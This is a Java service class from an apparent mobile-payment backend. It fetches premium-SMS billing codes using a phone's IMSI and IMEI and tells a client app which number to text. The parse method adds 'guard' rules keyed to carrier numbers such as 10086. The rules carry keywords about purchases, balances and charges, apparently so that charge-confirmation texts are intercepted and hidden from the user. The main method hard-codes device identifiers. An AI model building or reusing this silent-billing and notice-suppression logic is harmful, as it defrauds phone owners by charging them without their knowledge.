package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.Constants;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.qlzf.commons.helper.MD5Encrypt;

/**
 * http://payment.talkyun.com.cn/mmchannel/BillingReq?imsi=124523424232&paycode=30000769613005&imei=860770020468382&userdata=12345
 * @author leoliu
 *
 */
public class TwMmDynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(TwMmDynamicService.class);
	
	private static final String TYPE = "twMm";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "imsi={imsi}&paycode={paycode}&imei={imei}&userdata=12345";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			String paycode = map.get("paycode");
			
			String param = REQUESTMODEL.replace("{paycode}",paycode).replace("{imei}",imei).replace("{imsi}",imsi);
			
			String responseTxt = GetData.getData(url, param);
			
			xml = parse(responseTxt);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	/**
	 * send to 1065842410  a3#1MB7P#0#1L7E152G#8H48ADRHJY#2MZPAG#AMU5VMPCD#61321F4F13B69C46#56E90F44B5116264#FD815A553A2369A3#12345
	 * @param responseTxt
	 * @return
	 */
	private String parse(String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 0){
			responseTxt = responseTxt.replace("send to ", "").replace("  ", " ");
			
			logger.info(responseTxt);
			
			try{
				String[] arr = responseTxt.split(" ");
				
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(arr[1]);
				sms.setSmsDest(arr[0]);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
				
				guardList.add(guard3);
				guardList.add(guard4);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
			}catch(Exception e){
				
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		String url = "http://payment.talkyun.com.cn/mmchannel/BillingReq";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B101a087654321");
		map.put("imei", "862949029214504");
		map.put("imsi", "460022101441340");
		map.put("paycode","30000769613005");
		map.put("type","twMm");
		
		System.out.println(new TwMmDynamicService().dynamic(map));
	}

}
